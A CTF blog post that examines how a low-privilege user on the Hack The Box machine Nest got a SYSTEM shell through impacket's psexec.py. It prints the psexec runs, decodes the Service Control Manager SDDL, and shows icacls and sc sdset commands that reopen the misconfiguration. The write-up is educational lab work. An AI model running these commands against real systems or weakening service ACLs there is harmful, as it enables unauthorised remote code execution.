# Digging into PSExec with HTB Nest

[hackthebox](/tags#hackthebox ) [ctf](/tags#ctf ) [htb-nest](/tags#htb-nest )
[psexec](/tags#psexec ) [smb](/tags#smb ) [windows](/tags#windows )
[scmanager](/tags#scmanager ) [sddl](/tags#sddl ) [dacl](/tags#dacl )
[sacl](/tags#sacl ) [ace](/tags#ace ) [icacls](/tags#icacls )  
  
Jan 26, 2020

  * [HTB: Nest](/2020/06/06/htb-nest.html)
  * Digging into PSExec

![](https://0xdfimages.gitlab.io/img/nest-unintended-cover.png)

“You have to have administrator to PSExec.” That’s what I’d always heard. Nest
released on HTB yesterday, and on release, it had an unintended path where a
low-priv user was able to PSExec, providing a shell as SYSTEM. This has now
been patched, but I thought it was interesting to see what was configured that
allowed this non-admin user to get a shell with PSExec. Given this is a live
box, I won’t go into any of the details that still matter, saving that for a
write-up in 20ish weeks or so.

## Unintended Exploit

While working on Nest, I managed to acquire a password for the user TempUser
(I’ll obfuscate it in this post). Until the patch yesterday evening, there was
a misconfiguration in the box that allowed using `psexec`.

    
    
    root@kali# psexec.py 'tempuser:***********@10.10.10.178'
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                  
    
    [*] Requesting shares on 10.10.10.178.....
    [-] share 'ADMIN$' is not writable.                   
    [-] share 'C$' is not writable.
    [-] share 'Data' is not writable.
    [-] share 'Secure$' is not writable.                  
    [*] Found writable share Users
    [*] Uploading file AeqkAUZe.exe
    [*] Opening SVCManager on 10.10.10.178.....
    [*] Creating service gMyg on 10.10.10.178.....
    [*] Starting service gMyg.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Windows\system32>whoami
    nt authority\system 
    

With a shell as SYSTEM, I was able to find both `user.txt` and `root.txt`

## How Did This Happen

### Not Admin

What is it about TempUser that allows that account to PsExec? The common
knowledge I’ve always heard is that you need to be an administrator to PsExec.
TempUser is not an administrator:

    
    
    C:\>net user tempuser
    User name                    TempUser
    Full Name                    TempUser
    Comment                      Temp User Account
    User's comment               
    Country code                 000 (System Default)
    Account active               Yes
    Account expires              Never
    
    Password last set            8/5/2019 10:08:47 PM
    Password expires             Never
    Password changeable          8/5/2019 10:08:47 PM
    Password required            Yes
    User may change password     No
    
    Workstations allowed         All
    Logon script                 
    User profile                 
    Home directory               
    Last logon                   1/26/2020 2:37:14 PM
    
    Logon hours allowed          All
    
    Local Group Memberships      *Users                
    Global Group memberships     *None                 
    The command completed successfully.
    

### Requirements for PSExec

The actual requirements for PsExec are that the user can:

  * Write a file to the share.
  * Create and start a service.

You can see this in the messages from `psexec.py`:

    
    
    [*] Requesting shares on 10.10.10.178.....
    [-] share 'ADMIN$' is not writable.                   
    [-] share 'C$' is not writable.
    [-] share 'Data' is not writable.
    [-] share 'Secure$' is not writable.                  
    [*] Found writable share Users
    [*] Uploading file AeqkAUZe.exe
    [*] Opening SVCManager on 10.10.10.178.....
    [*] Creating service gMyg on 10.10.10.178.....
    [*] Starting service gMyg.....
    

It finds a writable share, writes an executable, creates a service, and starts
the service.

### Service Permissions

The writable share bit is clear. What does it mean to be able to create and
start a service? I can see that by pulling the permissions list on the Service
Control Manager, or `scmanager`.

    
    
    C:\>sc sdshow scmanager
    D:(A;;KA;;;AU)(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)
    

The string output there is a Security Descriptor Definition Language (SDDL)
string. The documentation on these on the internet is harder to find than I
feel like it should be.

The string will breakdown into four sections, O for owner, G for group, D for
discretionary access control list (DACL), and S for system access control list
(SACL). It typically takes the
[format](https://itconnect.uw.edu/wares/msinf/other-help/understanding-sddl-
syntax/):

    
    
    O:owner_sidG:group_sidD:dacl_flags(string_ace1)(string_ace2)…(string_acen)S:sacl_flags(string_ace1)(string_ace2)…(string_acen)
    

The one above for `scmanager` omits the `O` and `G`, leaving `D` and `S`. Each
of DACLs and SACLs contain one or more access control entries (ACEs). An ACE
takes the [following format](https://docs.microsoft.com/en-
us/windows/win32/secauthz/ace-strings):

    
    
    ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
    

So I’ll start with the first one:

    
    
    (A;;KA;;;AU)
    

The ACE type is `A` for `ACCESS_ALLOWED_ACE_TYPE`. There are no flags. The
rights are `KA`, the registry key access rights of `KEY_ALL_ACCESS`. There’s
no guid, inherit guid. Then the [SID this applies
to](https://docs.microsoft.com/en-us/windows/win32/secauthz/sid-strings) is
`AU`, or `SDDL_AUTHENTICATED_USERS` or authenticated users. So any user that’s
authenticated has full access to the registry through this service.

The next string:

    
    
    (A;;CC;;;AU)
    

This is to allow all authenticated users `CC`, which is a directory service
object access right for `SDDL_CREATE_CHILD` or create child items.

This table breaks down the six DACL rights as given:

ACE | Users | Permissions  
---|---|---  
`(A;;KA;;;AU)` | Authenticated Users | Allow Registry Full Access  
`(A;;CC;;;AU)` | Authenticated Users | Allow Directory Create Child  
`(A;;CCLCRPRC;;;IU)` | Interactively Logged-On Users | Allow Directory Create Child, List, Read Properties, and Generic Read  
`(A;;CCLCRPRC;;;SU)` | Service Logon Users | Allow Directory Create Child, List, Read Properties, and Generic Read  
`(A;;CCLCRPWPRC;;;SY)` | Local System | Allow Directory Create Child, List, Read Properties, and Generic Read, and Property Write  
`(A;;KA;;;BA)` | Built-in Administrators | Allow Registry Full Access  
  
I’ll notice right away that the first ACE string gives all authenticated users
the same permissions that the last string gives to administrators.

## Patch

### Share Not Writable

The box was patched last night (Jan 25 2020). So what does it look like now?
There were two changes I can see. The first is that the share is no longer
writable. If I run `psexec.py` with the same command line, it doesn’t find a
writable share:

    
    
    root@kali# psexec.py 'tempuser:***********@10.10.10.178'
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
    
    [*] Requesting shares on 10.10.10.178.....
    [-] share 'ADMIN$' is not writable.
    [-] share 'C$' is not writable.
    [-] share 'Data' is not writable.
    [-] share 'Secure$' is not writable.
    [-] share 'Users' is not writable.
    

### svcmanager

#### Make Share Writable

To see if that was the only change, I jumped back onto the host as SYSTEM
(using a different method I’ll save for the box retirement) and checked out
the permissions on the `users` folder:

    
    
    C:\Shares>icacls users
    users Everyone:(OI)(CI)(RX)
          NT AUTHORITY\SYSTEM:(OI)(CI)(F)
          BUILTIN\Administrators:(OI)(CI)(F)    
    

Everyone can read and execute, but not write. I’ll change that:

    
    
    C:\Shares>icacls users /grant :r Everyone:F
    processed file: users                                
    Successfully processed 1 files; Failed processing 0 files
    
    C:\Shares>icacls users
    users Everyone:(F)
          BUILTIN\BUILTIN:(R)
          Everyone:(OI)(CI)(RX)
          NT AUTHORITY\SYSTEM:(OI)(CI)(F)
          BUILTIN\Administrators:(OI)(CI)(F)
    
    Successfully processed 1 files; Failed processing 0 files
    

#### New PSExec Fail

Now when I run `psexec.py`, it finds the writable share, but fails later:

    
    
    root@kali# psexec.py 'tempuser:***********@10.10.10.178'
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
    
    [*] Requesting shares on 10.10.10.178.....
    [-] share 'ADMIN$' is not writable.
    [-] share 'C$' is not writable.
    [-] share 'Data' is not writable.
    [-] share 'Secure$' is not writable.
    [*] Found writable share Users
    [*] Uploading file WOFaTJjw.exe
    [*] Opening SVCManager on 10.10.10.178.....
    [-] Error opening SVCManager on 10.10.10.178.....
    [-] Error performing the installation, cleaning up: Unable to open SVCManager
    

It can’t open the Service Control Manager.

#### svcmanager Permissions

I’ll check the Service Control Manager permissions, just like before:

    
    
    C:\>sc sdshow scmanager
    
    D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)
    

I’ll compare what’s different (spaces added by me to get things to line up):

    
    
    orig:    D:(A;;KA;;;AU)(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)
    patched: D:            (A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)
    

`(A;;KA;;;AU)` has been removed.

### Complete Unpatch

I’ll set the `scmanager` SDDL string back to add back in the `KA` for
authenticated users:

    
    
    C:\>sc sdset scmanager "D:(A;;KA;;;AU)(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)"
    [SC] SetServiceObjectSecurity SUCCESS
    

Now I can `psexec.py` again:

    
    
    root@kali# psexec.py 'tempuser:***********@10.10.10.178'
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
    
    [*] Requesting shares on 10.10.10.178.....
    [-] share 'ADMIN$' is not writable.
    [-] share 'C$' is not writable.
    [-] share 'Data' is not writable.
    [-] share 'Secure$' is not writable.
    [*] Found writable share Users
    [*] Uploading file hEiGiDkm.exe
    [*] Opening SVCManager on 10.10.10.178.....
    [*] Creating service rrYY on 10.10.10.178.....
    [*] Starting service rrYY.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Windows\system32>
    

[« HTB: Nest](/2020/06/06/htb-nest.html)

[](/2020/01/26/digging-into-psexec-with-htb-nest.html)

